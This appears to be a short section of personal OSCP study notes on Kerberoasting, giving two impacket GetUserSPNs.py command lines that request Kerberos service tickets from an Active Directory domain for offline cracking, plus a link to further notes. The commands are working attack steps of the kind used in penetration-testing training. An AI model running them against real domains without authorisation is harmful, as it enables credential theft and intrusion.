## Kerberoasting

Use **GetUserSPNs.py** from impacket to get administrator Kerberos ticket
```
//You need credentials of any user to do that
./GetUserSPNs.py -request <domain>/<user>
GetUserSPNs.py -request -dc-ip <IP> <domain>/<user> -save -outputfile GetUserSPNs.out
```

More info here: https://github.com/nestef23/my-OSCP-notes/blob/main/Active%20Directory/Kerberoasting.md
